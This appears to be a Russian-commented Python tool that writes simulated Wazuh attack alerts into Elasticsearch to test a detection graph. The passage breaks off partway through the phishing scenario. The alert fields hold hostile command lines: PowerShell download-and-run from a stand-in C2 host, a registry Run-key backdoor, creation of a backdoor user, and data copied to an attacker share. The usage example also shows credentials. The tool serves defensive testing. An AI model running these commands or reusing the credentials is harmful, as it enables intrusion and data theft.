"""
Скрипт симуляции атак для Wazuh 4.x.

Назначение:
  Генерирует реалистичные фейковые алерты атак и записывает их напрямую
  в Elasticsearch/OpenSearch Indexer (в индекс wazuh-alerts-4.x-YYYY.MM.DD).
  Это позволяет протестировать Graph Attack Chain tool без реальных атак —
  граф построится по инъектированным алертам так же, как по настоящим.

Архитектурная роль:
  ┌──────────────────┐      ┌────────────────────┐      ┌──────────────────┐
  │ simulate_attack   │─────▶│ Elasticsearch      │◀─────│ Wazuh Manager    │
  │ (этот скрипт)     │      │ (wazuh-alerts-4.x) │      │ (real alerts)    │
  └──────────────────┘      └────────────────────┘      └──────────────────┘
                                     │
                                     ▼
                           ┌──────────────────┐
                           │ Flask backend    │
                           │ graph_engine.py  │
                           └──────────────────┘

  Скрипт обращается к Wazuh API только для получения списка реальных агентов
  (id, name, ip). Все алерты генерируются локально и пишутся в ES по REST API.

Принцип работы:
  1. Аутентификация в Wazuh API (GET + Basic Auth + ?raw=true) → JWT-токен
  2. Получение списка агентов через /agents?select=id,name,ip,...
  3. Выбор агента (предпочтительно не-менеджер, id != "000")
  4. Генерация алертов по выбранному сценарию (с временными метками в прошлом)
  5. Постановка каждого алерта в ES: PUT /wazuh-alerts-4.x-YYYY.MM.DD/_doc/{id}

Формат алерта Wazuh (документ в Elasticsearch):
  Обязательные поля:
    @timestamp     — ISO-8601 UTC (напр. "2026-03-05T14:30:00.000Z")
    timestamp      — дубликат @timestamp (Wazuh использует оба)
    id             — уникальный ID алерта (строка, обычно millis-метка + random)
    manager.name   — имя Wazuh Manager (напр. "wazuh.manager")
    agent.id       — ID агента ("001", "002", ...)
    agent.name     — имя агента ("wind", "linux-01", ...)
    agent.ip       — IP-адрес агента ("192.168.1.100")
    rule.id        — ID правила Wazuh (строка, напр. "5716", "554")
    rule.level     — уровень серьёзности 0–15 (см. шкалу ниже)
    rule.description — человекочитаемое описание правила
    rule.groups    — список групп правил (напр. ["windows", "process"])
    rule.firedtimes — сколько раз правило сработало (всегда 1 для фейковых)
    full_log       — полная строка лога (отображается в UI Wazuh)
    decoder.name   — имя декодера (у нас "simulated")
    location       — источник алерта (у нас "SimulatedEvent")

  Опциональные поля:
    srcip          — source IP (кто инициировал)
    dstip          — destination IP (куда направлено)
    data.dstport   — порт назначения
    data.*         — дополнительные данные (dns.query, win.eventdata.*, syscheck.*, auth.*)

  Шкала уровней Wazuh (rule.level):
    0  — нет серьёзности (информационный)
    1–4 — низкая (low)
    5–6 — средняя (medium)
    7–9 — высокая (high)
    10–12 — критическая (critical)
    13–15 — очень критическая (используется редко)

Использование:
  python simulate_attack.py \
    --url https://31.77.202.176:55000 \
    --user wazuh-wui --pass 'MyS3cr37P450r.*-' \
    --es-url https://31.77.202.176:9200 \
    --es-user admin --es-pass SecretPassword \
    --scenario all

Сценарии атак (4 сценария + all):
  lateral_movement    — Латеральное движение через RDP + PowerShell (10 алертов)
                        MITRE ATT&CK: T1021.001, T1059.001, T1083, T1078, T1547.001
  phishing_c2         — Фишинг → макрос → C2-канал (9 алертов)
                        MITRE ATT&CK: T1566.001, T1204.002, T1059.001, T1071.001
  privilege_escal     — Повышение привилегий через web-shell (5 алертов)
                        MITRE ATT&CK: T1068, T1078, T1053, T1547.001, T1098
  data_exfil          — Разведка → архивация → эксфильтрация (5 алертов)
                        MITRE ATT&CK: T1083, T1005, T1048, T1041, T1071.001
  all                 — Все 4 сценария (29 алертов всего)

Зависимости:
  - requests     — HTTP-запросы к Wazuh API и Elasticsearch
  - argparse     — разбор аргументов командной строки
  - json, random, time, sys — стандартная библиотека
"""

import argparse    # Разбор аргументов командной строки (--url, --scenario и т.д.)
import json        # Не используется напрямую, но доступна для отладки/расширения
import random      # Генерация случайных суффиксов для ID алертов
import requests    # HTTP-клиент для Wazuh API и Elasticsearch REST API
import sys         # sys.exit() при критических ошибках
import time        # time.sleep() между инъекциями алертов (0.05 с)
from datetime import datetime, timedelta, timezone  # Работа с UTC-временными метками
from typing import Optional  # Типизация: Optional[str] для wazuh_token


class AttackSimulator:
    """
    Основной класс симулятора атак.

    Инкапсулирует всё необходимое для генерации и инъекции фейковых алертов:
      - Подключение к Wazuh API (аутентификация, получение агентов)
      - Подключение к Elasticsearch (инъекция алертов)
      - 4 сценария атак (lateral_movement, phishing_c2, privilege_escalation, data_exfil)
      - Вспомогательные методы генерации алертов (_ts, _alert, _pick_agent)

    Атрибуты:
      wazuh_url (str)     — URL Wazuh API (напр. "https://31.77.202.176:55000")
      wazuh_user (str)    — логин Wazuh API (напр. "wazuh-wui")
      wazuh_pass (str)    — пароль Wazuh API
      es_url (str)        — URL Elasticsearch (напр. "https://31.77.202.176:9200")
      es_user (str)       — логин Elasticsearch (напр. "admin")
      es_pass (str)       — пароль Elasticsearch
      verify_ssl (bool)   — проверять ли SSL-сертификаты (обычно False для self-signed)
      wazuh_token (Optional[str]) — JWT-токен Wazuh API (получается при _wazuh_auth)
      manager_name (str)  — имя Wazuh Manager (по умолчанию "wazuh.manager")
    """

    def __init__(self, wazuh_url, wazuh_user, wazuh_pass,
                 es_url="", es_user="", es_pass="", verify_ssl=False):
        """
        Инициализация симулятора.

        Аргументы:
          wazuh_url   — URL Wazuh API (https://host:55000)
          wazuh_user  — логин Wazuh API
          wazuh_pass  — пароль Wazuh API
          es_url      — URL Elasticsearch (https://host:9200), пустая строка = не инъектировать
          es_user     — логин Elasticsearch
          es_pass     — пароль Elasticsearch
          verify_ssl  — проверять SSL-сертификаты (False для self-signed Wazuh)
        """
        self.wazuh_url = wazuh_url.rstrip("/")   # Убираем trailing slash для корректных URL
        self.wazuh_user = wazuh_user
        self.wazuh_pass = wazuh_pass
        self.es_url = es_url.rstrip("/") if es_url else ""  # ES URL или пустая строка
        self.es_user = es_user
        self.es_pass = es_pass
        self.verify_ssl = verify_ssl
        self.wazuh_token: Optional[str] = None   # JWT-токен, получаемый через _wazuh_auth()
        self.manager_name = "wazuh.manager"       # Значение по умолчанию, обновляется из API

    # === Wazuh API (GET + Basic Auth + ?raw=true) ===
    # Wazuh 4.x API использует аутентификацию:
    #   GET /security/user/authenticate?raw=true
    #   с Basic Auth (user:pass в заголовке Authorization)
    #   Ответ — JWT-токен в виде plain text (благодаря ?raw=true)

    def _wazuh_auth(self):
        """
        Аутентификация в Wazuh API.

        Метод: GET /security/user/authenticate?raw=true
        Аутентификация: HTTP Basic Auth (user:pass)
        Ответ: plain-text JWT-токен (без JSON-обёртки, благодаря ?raw=true)

        После успешной аутентификации токен сохраняется в self.wazuh_token
        и используется во всех последующих запросах через _wazuh_get().

        Raises:
            requests.HTTPError — при неверных кредах или недоступном API
        """
        resp = requests.get(
            f"{self.wazuh_url}/security/user/authenticate?raw=true",
            auth=(self.wazuh_user, self.wazuh_pass),  # Basic Auth
            verify=self.verify_ssl, timeout=30,
        )
        resp.raise_for_status()           # Выбросит исключение при 4xx/5xx
        self.wazuh_token = resp.text.strip()  # Токен как plain text

    def _wazuh_get(self, path, params=None):
        """
        Выполнить GET-запрос к Wazuh API с JWT-токеном.

        Аргументы:
          path   — путь API (напр. "/agents", "/")
          params — query-параметры (dict)

        Возвращает:
          dict — распарсенный JSON-ответ Wazuh API

        Заголовок: Authorization: Bearer <token>
        """
        resp = requests.get(
            f"{self.wazuh_url}{path}",
            params=params,
            headers={"Authorization": f"Bearer {self.wazuh_token}"},  # JWT-токен
            verify=self.verify_ssl, timeout=30,
        )
        resp.raise_for_status()
        return resp.json()

    def get_existing_agents(self) -> list[dict]:
        """
        Получить список зарегистрированных агентов Wazuh.

        Запрос: GET /agents?limit=500&select=id,name,ip,status,version,lastKeepAlive

        Важно: в select НЕ используем вложенные поля (os.*, group),
        т.к. Wazuh API 4.x возвращает 400 Bad Request на вложенные поля select.

        Возвращает:
          list[dict] — список агентов, каждый с полями:
            id           — ID агента ("000" = менеджер, "001"+ = реальные)
            name         — имя агента ("wind", "linux-01", ...)
            ip           — IP-адрес ("192.168.1.100")
            status       — статус ("active", "disconnected", ...)
            version      — версия Wazuh Agent ("v4.7.0")
            lastKeepAlive — timestamp последнего keepalive
        """
        result = self._wazuh_get("/agents", params={
            "limit": 500,  # Максимум агентов за один запрос
            "select": "id,name,ip,status,version,lastKeepAlive",  # Без вложенных полей!
        })
        return result.get("data", {}).get("affected_items", [])  # Структура Wazuh API ответа

    def get_manager_info(self):
        """
        Получить информацию о Wazuh Manager (имя хоста).

        Запрос: GET /?pretty=true
        Ответ содержит data.hostname — имя менеджера.

        Сохраняется в self.manager_name для использования в поле
        manager.name генерируемых алертов.
        """
        result = self._wazuh_get("/", params={"pretty": "true"})
        self.manager_name = result.get("data", {}).get("hostname", "wazuh.manager")

    # === Elasticsearch ===
    # Алерты записываются напрямую в Elasticsearch/OpenSearch Indexer
    # через REST API: PUT /<index>/_doc/<id>
    # Индекс: wazuh-alerts-4.x-YYYY.MM.DD (Wazuh 4.x формат daily rollover)

    def _es_request(self, method, path, json_data=None):
        """
        Выполнить HTTP-запрос к Elasticsearch REST API.

        Аргументы:
          method    — HTTP-метод ("PUT", "GET", "POST")
          path      — путь API (напр. "/wazuh-alerts-4.x-2026.03.05/_doc/1234")
          json_data — тело запроса (dict, будет сериализовано в JSON)

        Возвращает:
          dict — распарсенный JSON-ответ Elasticsearch

        Аутентификация: HTTP Basic Auth (es_user:es_pass) или без аутентификации
        если es_user не указан.

        Raises:
            RuntimeError — если es_url не указан
            requests.HTTPError — при ошибке ES (401, 403, 404, 500, ...)
        """
        if not self.es_url:
            raise RuntimeError("Elasticsearch URL не указан (--es-url)")
        auth = (self.es_user, self.es_pass) if self.es_user else None  # Basic Auth или None
        resp = requests.request(
            method, f"{self.es_url}{path}",
            json=json_data, auth=auth,
            verify=self.verify_ssl,        # SSL-верификация (обычно False)
            headers={"Content-Type": "application/json"},  # ES ожидает JSON
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json()

    def inject_alert(self, alert: dict):
        """
        Записать один алерт в Elasticsearch.

        Процесс:
          1. Извлечь @timestamp из алерта (или использовать текущее UTC-время)
          2. Определить имя индекса: wazuh-alerts-4.x-YYYY.MM.DD
             (Wazuh 4.x использует daily rollover — один индекс на день)
          3. Определить document ID: millis-метка + случайный суффикс
          4. Выполнить PUT /<index>/_doc/<id> с телом алерта

        Аргументы:
          alert (dict) — документ алерта в формате Wazuh (см. модульный docstring)

        Примечание:
          Elasticsearch автоматически создаёт индекс при первой записи.
          Маппинг индекса определяется шаблоном Wazuh (wazuh-alerts-template),
          но для фейковых алертов это не критично — ES динамически маппит поля.
        """
        ts = alert.get("@timestamp", datetime.now(timezone.utc).isoformat())
        try:
            dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))  # Парсим ISO-8601
        except Exception:
            dt = datetime.now(timezone.utc)  # Fallback на текущее время
        index_name = f"wazuh-alerts-4.x-{dt.strftime('%Y.%m.%d')}"  # Daily index: wazuh-alerts-4.x-2026.03.05
        alert_id = alert.get("id", f"{int(dt.timestamp() * 1000)}")  # Уникальный ID документа
        # PUT-запрос создаёт или перезаписывает документ по данному ID
        self._es_request("PUT", f"/{index_name}/_doc/{alert_id}", alert)

    # === Генерация алертов ===
    # Вспомогательные методы для создания документов алертов
    # в формате, совместимом с Wazuh 4.x

    def _ts(self, minutes_ago: float) -> str:
        """
        Сгенерировать ISO-8601 timestamp в прошлом.

        Аргументы:
          minutes_ago — на сколько минут назад от текущего UTC-времени

        Возвращает:
          str — timestamp в формате "YYYY-MM-DDTHH:MM:SS.mmmZ"

        Пример:
          _ts(30) → "2026-03-05T14:00:00.123Z" (30 минут назад)

        Используется для создания временных меток алертов:
          - Более ранние шаги атаки имеют большее значение minutes_ago
          - base = 55 означает, что первый алерт — 55 минут назад
          - Последующие шаги: base-3, base-8, base-12, ... (раньше по времени)
        """
        t = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
        return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"  # Обрезаем микросекунды до миллисекунд

    def _alert(self, agent_id, agent_name, agent_ip,
               rule_id, rule_level, rule_description, rule_groups,
               timestamp, full_log,
               srcip=None, dstip=None, dstport=None,
               data_extra=None):
        """
        Создать документ алерта в формате Wazuh 4.x.

        Это основной конструктор алертов. Все 4 сценария используют его
        для генерации каждого шага атаки.

        Аргументы:
          agent_id         — ID агента Wazuh (напр. "001")
          agent_name       — имя агента (напр. "wind")
          agent_ip         — IP-адрес агента (напр. "192.168.1.100")
          rule_id          — ID правила Wazuh (int → str, напр. 5716)
          rule_level       — уровень серьёзности 0–15
          rule_description — описание правила (показывается в UI)
          rule_groups      — список групп правил (напр. ["windows", "process"])
          timestamp        — ISO-8601 timestamp (генерируется через _ts())
          full_log         — полная строка лога (показывается в UI Wazuh)
          srcip            — source IP (опционально, кто инициировал)
          dstip            — destination IP (опционально, куда направлено)
          dstport          — порт назначения (опционально, записывается в data.dstport)
          data_extra       — дополнительные данные (dict, сливается с data)

        Возвращает:
          dict — документ алерта, совместимый с Wazuh 4.x

        Структура возвращаемого документа:
          {
            "@timestamp": "2026-03-05T14:30:00.123Z",
            "timestamp": "2026-03-05T14:30:00.123Z",  # дубликат
            "id": "1709644200123456",                  # уникальный ID
            "manager": {"name": "wazuh.manager"},
            "agent": {"id": "001", "name": "wind", "ip": "192.168.1.100"},
            "rule": {
              "id": "5716", "level": 7,
              "description": "Suspicious PowerShell...",
              "groups": ["windows", "process"],
              "firedtimes": 1
            },
            "full_log": "powershell.exe -enc ...",
            "decoder": {"name": "simulated"},
            "location": "SimulatedEvent",
            "srcip": "192.168.1.105",      # опционально
            "dstip": "10.0.0.50",          # опционально
            "data": {"dstport": 443, ...}  # опционально
          }

        ID алерта:
          Формат: <millis_timestamp><random_3_digit>
          Пример: "1709644200123" + "456" = "1709644200123456"
          Это обеспечивает уникальность даже при одинаковых timestamp.
        """
        alert = {
            "@timestamp": timestamp,         # Основная временная метка (ES сортирует по ней)
            "timestamp": timestamp,          # Дубликат (Wazuh использует оба поля)
            "id": f"{int(datetime.fromisoformat(timestamp.replace('Z', '+00:00')).timestamp() * 1000)}{random.randint(100,999)}",  # Уникальный ID: millis + random
            "manager": {"name": self.manager_name},  # Имя Wazuh Manager
            "agent": {"id": agent_id, "name": agent_name, "ip": agent_ip},  # Информация об агенте
            "rule": {
                "id": str(rule_id),          # ID правила (строка, напр. "5716")
                "level": rule_level,          # Уровень серьёзности 0–15
                "description": rule_description,  # Описание для UI
                "groups": rule_groups,        # Группы правил (для категоризации)
                "firedtimes": 1,              # Количество срабатываний (1 для фейковых)
            },
            "full_log": full_log,            # Полный лог (отображается в Wazuh Dashboard)
            "decoder": {"name": "simulated"},  # Декодер (фиктивный, для идентификации)
            "location": "SimulatedEvent",     # Источник алерта (фиктивный)
        }
        # Опциональные поля сети
        if srcip:
            alert["srcip"] = srcip           # Source IP — кто инициировал соединение/действие
        if dstip:
            alert["dstip"] = dstip           # Destination IP — куда направлено
        if dstport:
            alert.setdefault("data", {})["dstport"] = dstport  # Порт назначения в data.dstport
        # Дополнительные данные (слияние с существующими data)
        if data_extra:
            alert["data"] = {**alert.get("data", {}), **data_extra}
        return alert

    def _pick_agent(self, agents: list[dict], prefer_names: list[str] = None) -> dict:
        """
        Выбрать агента для симуляции атаки.

        Логика выбора:
          1. Если указан prefer_names — ищет первого агента с совпадающим именем
          2. Иначе — берёт первого агента с id != "000" (не-менеджер)
          3. Если нет реальных агентов — возвращает фиктивного {"id": "001", ...}

        Аргументы:
          agents       — список агентов от get_existing_agents()
          prefer_names — предпочитаемые имена агентов (опционально)

        Возвращает:
          dict — выбранный агент с полями id, name, ip

        Примечание:
          Агент с id="000" — это сам Wazuh Manager, его обычно не используют
          для симуляции атак на конечных хостах.
        """
        if prefer_names:
            # Сначала пробуем предпочитаемые имена
            for a in agents:
                if a.get("name") in prefer_names:
                    return a
        # Берём первого не-менеджера (id != "000")
        for a in agents:
            if a.get("id") != "000":
                return a
        # Fallback: если только менеджер или пустой список — фиктивный агент
        return agents[0] if agents else {"id": "001", "name": "agent-01", "ip": "192.168.1.100"}

    # ============================================================
    #  СЦЕНАРИИ АТАК
    # ============================================================
    # Каждый сценарий:
    #   1. Выбирает агента через _pick_agent()
    #   2. Генерирует цепочку алертов с убывающими timestamp
    #   3. Возвращает list[dict] — список документов алертов
    #
    # Временные метки:
    #   base = начальное смещение в минутах (напр. 55)
    #   Каждый последующий шаг: base-N (раньше по времени)
    #   Это создаёт хронологическую цепочку: первый шаг — раньше, последний — позже
    #
    # Используемые Wazuh rule IDs (реальные ID из правил Wazuh):
    #   5503 — RDP-аутентификация (authentication_success)
    #   5103 — SMB-сессия (authentication_success)
    #   5716 — Подозрительный PowerShell (windows, process)
    #   5102 — DNS-запрос / сетевое соединение (network, dns/firewall)
    #    554 — Изменение реестра / файла (windows, syscheck)
    #    592 — Создание пользователя (windows, process)

    def scenario_lateral_movement(self, agents: list[dict]) -> list[dict]:
        """
        Сценарий: Латеральное движение (Lateral Movement).

        Модель атаки:
          Атакующий (192.168.1.105) проникает на хост жертвы через RDP,
          устанавливает SMB-сессию, выполняет разведку через PowerShell,
          устанавливает persistency через реестр, создаёт backdoor-пользователя,
          размещает вредоносный DLL, копирует данные и загружает payload с C2-сервера.

        MITRE ATT&CK техники:
          T1021.001 — Remote Services: Remote Desktop Protocol (RDP)
          T1059.001 — Command and Scripting Interpreter: PowerShell
          T1083     — File and Directory Discovery
          T1078     — Valid Accounts
          T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys

        Шаги атаки (10 алертов, base=55 минут назад):
          1. RDP-вход (rule 5503, level 5) — атакующий заходит через RDP с IP 192.168.1.105
             Поля: srcip=192.168.1.105, dstip=<agent_ip>, dstport=3389, data.auth.user="admin"
          2. SMB-сессия (rule 5103, level 3) — открывается SMB-сессия для передачи файлов
             Поля: srcip=192.168.1.105, dstport=445, data.auth.user="admin"
          3. PowerShell с encoded-командой (rule 5716, level 7) — обфусцированный PowerShell
             Поля: data.win.eventdata.image="powershell.exe", commandLine содержит -enc
          4. PowerShell скачивание скрипта (rule 5716, level 8) — DownloadString с 10.0.0.50
             Поля: srcip=<agent_ip>, dstip=10.0.0.50
          5. DNS-запрос к подозрительному домену (rule 5102, level 5) — evil-c2-server.xyz
             Поля: dstport=53, data.dns.query="evil-c2-server.xyz"
          6. Изменение реестра для persistence (rule 554, level 6) — Run key Backdoor
             Поля: data.win.eventdata.targetObject="HKLM\...\Run", actionType="SetValue"
          7. Создание backdoor-пользователя (rule 592, level 8) — net user backdoor /add
             Поля: data.win.eventdata.targetUserName="backdoor"
          8. Создание подозрительного DLL (rule 554, level 7) — svchost_evil.dll в Temp
             Поля: data.win.eventdata.targetFilename, actionType="FileCreated"
          9. Массовое копирование файлов (rule 554, level 9) — xcopy на внешний share
             Поля: srcip=192.168.1.105, actionType="FileCopied"
          10. PowerShell скачивание payload с C2 (rule 5716, level 10) — загрузка с evil-c2-server.xyz
              Поля: srcip=<agent_ip>, dstip=45.33.32.156

        Wazuh rule IDs, используемые в сценарии:
          5503 — RDP-аутентификация (группа: authentication_success)
          5103 — SMB-сессия (группа: authentication_success)
          5716 — Подозрительный PowerShell (группы: windows, process)
          5102 — DNS/сетевое соединение (группы: network, dns)
           554 — Изменение реестра/файла (группы: windows, syscheck)
           592 — Создание пользователя (группы: windows, process)

        Аргументы:
          agents — список агентов Wazuh (для выбора целевого хоста)

        Возвращает:
          list[dict] — 10 алертов, описывающих цепочку латерального движения
        """
        a = self._pick_agent(agents)  # Выбираем целевой агент
        aid, aname, aip = a["id"], a["name"], a.get("ip", "192.168.1.100")  # ID, имя, IP агента
        attacker = "192.168.1.105"   # IP атакующего (фиксированный для сценария)
        alerts = []
        base = 55                    # Первый алерт — 55 минут назад

        # ------------------------------------------------------------------
        # Шаг 1: RDP-вход атакующего на хост жертвы
        # MITRE: T1021.001 — Remote Desktop Protocol
        # Rule: 5503 (authentication_success), Level: 5 (medium)
        # Атакующий подключается по RDP (порт 3389) с внешнего IP
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5503, 5,
            "Successful RDP login from external IP",
            ["authentication_success"], self._ts(base),  # 55 мин назад
            f"User 'admin' logged in via RDP from {attacker}",
            srcip=attacker, dstip=aip, dstport=3389,     # RDP = порт 3389
            data_extra={"auth": {"user": "admin", "type": "RDP"}},  # Данные аутентификации
        ))

        # ------------------------------------------------------------------
        # Шаг 2: SMB-сессия — атакующий открывает SMB для передачи файлов
        # MITRE: T1021.002 — SMB/Admin Shares
        # Rule: 5103 (authentication_success), Level: 3 (low)
        # SMB = порт 445, используется для файловых операций и exec
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5103, 3,
            "SMB session opened",
            ["authentication_success"], self._ts(base - 3),  # 52 мин назад
            f"SMB session for user 'admin' from {attacker}",
            srcip=attacker, dstip=aip, dstport=445,          # SMB = порт 445
            data_extra={"auth": {"user": "admin", "type": "SMB"}},
        ))

        # ------------------------------------------------------------------
        # Шаг 3: Подозрительный PowerShell с encoded-командой
        # MITRE: T1059.001 — PowerShell, T1140 — Deobfuscate/Decode Files
        # Rule: 5716 (windows, process), Level: 7 (high)
        # -enc флаг = Base64-кодированная команда (обфускация)
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 7,
            "Suspicious PowerShell execution with encoded command",
            ["windows", "process"], self._ts(base - 8),  # 47 мин назад
            "powershell.exe -enc <base64_encoded_command>",
            data_extra={"win": {"eventdata": {
                "image": "powershell.exe",
                "commandLine": "powershell -enc <base64_encoded_command>",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 4: PowerShell скачивает скрипт с внешнего сервера
        # MITRE: T1059.001 — PowerShell, T1105 — Ingress Tool Transfer
        # Rule: 5716 (windows, process), Level: 8 (high)
        # IEX + DownloadString — классический паттерн скачивания payload
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 8,
            "PowerShell downloading remote script from external server",
            ["windows", "process"], self._ts(base - 12),  # 43 мин назад
            "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.50/recon.ps1')",
            srcip=aip, dstip="10.0.0.50",  # Соединение с внешним сервером
            data_extra={"win": {"eventdata": {
                "image": "powershell.exe",
                "commandLine": "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.50/recon.ps1')",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 5: DNS-запрос к подозрительному C2-домену
        # MITRE: T1071.004 — DNS Application Layer Protocol
        # Rule: 5102 (network, dns), Level: 5 (medium)
        # evil-c2-server.xyz — фиктивный C2-домен
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5102, 5,
            "DNS query to suspicious domain",
            ["network", "dns"], self._ts(base - 11),  # 44 мин назад
            "DNS query: evil-c2-server.xyz",
            srcip=aip, dstip="8.8.8.8", dstport=53,   # DNS = порт 53, DNS-сервер 8.8.8.8
            data_extra={"dns": {"query": "evil-c2-server.xyz"}},  # Запрашиваемый домен
        ))

        # ------------------------------------------------------------------
        # Шаг 6: Изменение реестра Windows для persistence
        # MITRE: T1547.001 — Boot/Logon Autostart: Registry Run Keys
        # Rule: 554 (windows, syscheck), Level: 6 (medium)
        # Добавление в HKLM\...\Run = автоматический запуск при загрузке
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 554, 6,
            "Windows registry modification for persistence",
            ["windows", "syscheck"], self._ts(base - 18),  # 37 мин назад
            "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe",
            data_extra={"win": {"eventdata": {
                "image": "reg.exe",
                "commandLine": 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"',
                "targetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",  # Ключ реестра
                "actionType": "SetValue",  # Действие: установка значения
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 7: Создание нового локального пользователя (backdoor)
        # MITRE: T1136.001 — Create Account: Local Account
        # Rule: 592 (windows, process), Level: 8 (high)
        # "net user backdoor P@ssw0rd! /add" — классический паттерн
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 592, 8,
            "New local user created",
            ["windows", "process"], self._ts(base - 22),  # 33 мин назад
            "net user backdoor P@ssw0rd! /add",
            data_extra={"win": {"eventdata": {
                "image": "net.exe",
                "commandLine": "net user backdoor P@ssw0rd! /add",
                "targetUserName": "backdoor",  # Имя созданного пользователя
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 8: Создание подозрительного DLL в системном каталоге
        # MITRE: T1105 — Ingress Tool Transfer, T1574.001 — DLL Side-Loading
        # Rule: 554 (windows, syscheck), Level: 7 (high)
        # svchost_evil.dll в C:\Windows\Temp — маскировка под системный файл
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 554, 7,
            "Suspicious file created in system directory",
            ["windows", "syscheck"], self._ts(base - 20),  # 35 мин назад
            "cmd /c echo malicious > C:\\Windows\\Temp\\svchost_evil.dll",
            data_extra={"win": {"eventdata": {
                "image": "cmd.exe",
                "commandLine": "cmd /c echo malicious > C:\\Windows\\Temp\\svchost_evil.dll",
                "targetFilename": "C:\\Windows\\Temp\\svchost_evil.dll",  # Путь файла
                "actionType": "FileCreated",  # Действие: создание файла
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 9: Массовое копирование данных на внешний сетевой share
        # MITRE: T1048 — Exfiltration Over Alternative Protocol
        # Rule: 554 (syscheck), Level: 9 (high)
        # xcopy C:\ConfidentialData → \\attacker\exfil
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 554, 9,
            "Mass file copy to external network share",
            ["syscheck"], self._ts(base - 28),  # 27 мин назад
            f"xcopy C:\\ConfidentialData \\\\{attacker}\\exfil /E /H /C /I",
            srcip=attacker,
            data_extra={"win": {"eventdata": {
                "image": "xcopy.exe",
                "commandLine": f"xcopy C:\\ConfidentialData \\\\{attacker}\\exfil /E /H /C /I",
                "targetFilename": "C:\\ConfidentialData",  # Исходная директория
                "actionType": "FileCopied",  # Действие: копирование
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 10: PowerShell скачивает payload с C2-сервера и запускает его
        # MITRE: T1059.001 — PowerShell, T1105 — Ingress Tool Transfer
        # Rule: 5716 (windows, process), Level: 10 (critical)
        # Invoke-WebRequest + запуск payload — финальный шаг установки
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 10,
            "PowerShell downloading payload from C2 server",
            ["windows", "process"], self._ts(base - 35),  # 20 мин назад
            "powershell -c Invoke-WebRequest -Uri http://evil-c2-server.xyz/payload.ps1 -OutFile C:\\payload.ps1; .\\payload.ps1",
            srcip=aip, dstip="45.33.32.156",  # Внешний C2 IP
            data_extra={"win": {"eventdata": {
                "image": "powershell.exe",
                "commandLine": "powershell -c Invoke-WebRequest -Uri http://evil-c2-server.xyz/payload.ps1 -OutFile C:\\payload.ps1; .\\payload.ps1",
            }}},
        ))

        return alerts  # 10 алертов латерального движения

    def scenario_phishing_c2(self, agents: list[dict]) -> list[dict]:
        """
        Сценарий: Фишинг → макрос → C2-канал (Phishing & Command & Control).

        Модель атаки:
          Пользователь открывает фишинговый документ (docm с макросом),
          макрос запускает PowerShell, который скачивает и выполняет beacon
          с C2-сервера. Затем устанавливается устойчивый C2-канал (heartbeat),
          и завершается сбором данных из чувствительных директорий.

        MITRE ATT&CK техники:
          T1566.001 — Phishing: Spearphishing Attachment
          T1204.002 — User Execution: Malicious File
          T1059.001 — Command and Scripting Interpreter: PowerShell
          T1071.001 — Application Layer Protocol: Web Protocols

        Шаги атаки (9 алертов, base=50 минут назад):
          1. Открытие фишингового Office-документа (rule 5716, level 6)
             WINWORD.EXE открывает Invoice_Q4_2024.docm — макрос внутри
             Поля: data.win.eventdata.image="WINWORD.EXE"
          2. DNS-запрос к C2-домену (rule 5102, level 5)
             update-service.microsoft-secure.xyz — имитация легитимного домена
             Поля: data.dns.query, dstport=53
          3. PowerShell IEX — скачивание beacon (rule 5716, level 10)
             IEX + DownloadString — скачивает и выполняет beacon.ps1 с C2
             Поля: srcip=<agent_ip>, dstip=45.33.32.156
          4-8. C2 heartbeat — 5 HTTPS-соединений (rule 5102, level 3)
             Каждые 3 минуты — keepalive-соединение к C2:443
             Поля: srcip=<agent_ip>, dstip=45.33.32.156, dstport=443
          9. Сбор данных (rule 554, level 7)
             Множественный доступ к Documents и Desktop
             Поля: data.syscheck.path, event="read"

        Wazuh rule IDs, используемые в сценарии:
          5716 — Подозрительный PowerShell/макрос (группы: windows, process)
          5102 — DNS-запрос / сетевое соединение (группы: network, dns/firewall)
           554 — Доступ к файлам (группы: syscheck, syscheck_read)

        C2-инфраструктура:
          Домен: update-service.microsoft-secure.xyz (имитация Microsoft)
          IP:    45.33.32.156
          Порт:  443 (HTTPS) для heartbeat, 80 для скачивания beacon

        Аргументы:
          agents — список агентов Wazuh

        Возвращает:
          list[dict] — 9 алертов, описывающих цепочку фишинг → C2
        """
        a = self._pick_agent(agents)
        aid, aname, aip = a["id"], a["name"], a.get("ip", "192.168.1.100")
        c2_domain = "update-service.microsoft-secure.xyz"  # C2-домен (имитация Microsoft)
        c2_ip = "45.33.32.156"                             # C2 IP-адрес
        alerts = []
        base = 50  # Первый алерт — 50 минут назад

        # ------------------------------------------------------------------
        # Шаг 1: Открытие фишингового Office-документа с макросом
        # MITRE: T1566.001 — Phishing: Spearphishing Attachment
        #         T1204.002 — User Execution: Malicious File
